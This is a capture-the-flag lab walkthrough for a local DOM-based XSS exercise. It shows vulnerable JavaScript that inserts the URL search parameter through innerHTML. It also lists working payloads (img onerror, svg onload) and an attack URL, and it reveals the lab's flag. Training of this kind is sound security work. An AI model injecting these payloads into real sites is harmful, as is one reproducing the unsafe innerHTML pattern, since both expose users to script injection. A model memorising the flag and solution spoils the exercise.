# Scenario 14: DOM XSS in innerHTML sink using source location.search

- **Port:** `8014`
- **Category:** Cross-Site Scripting (DOM-based XSS)
- **Difficulty:** Apprentice
- **Vulnerability:** DOM-based Cross-Site Scripting (`innerHTML` Sink & `location.search` Source)
- **Flag:** `CTF{d0m_xss_s1nk_m4st3r}`
- **Target URL:** `http://localhost:8014/` (or `http://<host>:8014/analytics`)

---

## Lab Description
This lab contains a DOM-based Cross-Site Scripting (DOM XSS) vulnerability in the blog search feature. It uses an `innerHTML` assignment to dynamically display the search terms on the page.

To solve this lab, perform a cross-site scripting attack that executes the `alert("cszone")` function.

---

## Exploitation Walkthrough (PortSwigger Academy Methodology)

### 1. Functional Black-Box Testing
1. Navigate to the blog home page: `http://localhost:8014/`.
2. Enter a test search string (e.g. `test`) into the search box and click **Search**.
3. Observe that the search string is sent as a query parameter in the URL:
   ```text
   http://localhost:8014/?search=test
   ```
4. Observe the page output rendering: **"Search results for: test"**.

### 2. Identifying Source & Sink
1. Right-click the search message and click **Inspect Element** (or press `Ctrl+U`).
2. Notice the client-side JavaScript execution handling the search query:
   ```javascript
   function doSearchQuery(query) {
       document.getElementById('searchMessage').innerHTML = 
           '<div class="search-result-banner"><span>Search results for:</span> <span class="search-query">' + query + '</span></div>';
   }

   const params = new URLSearchParams(window.location.search);
   const query = params.get("search");
   if (query) {
       doSearchQuery(query);
   }
   ```
   - **Source:** `location.search` (`search` query parameter).
   - **Sink:** `element.innerHTML` (Unsafe DOM insertion).

### 3. Exploitation & Flag Capture
1. Enter an `<img>` payload with `alert("cszone")` into the search box:
   ```html
   <img src=1 onerror=alert("cszone")>
   ```
   *(Or `"><img src=1 onerror="alert('cszone')">` / `<svg onload=alert("cszone")>`)*
2. Click **Search** (or submit directly via URL):
   ```text
   http://localhost:8014/?search=<img src=1 onerror=alert("cszone")>
   ```
3. The browser creates the `<img>` element during `innerHTML` DOM parsing, triggers the `onerror` event handler, and fires `alert("cszone")`.
4. The lab status turns to **SOLVED 🎉** and the CTF flag is revealed in the success banner:
   ```text
   CTF{d0m_xss_s1nk_m4st3r}
   ```
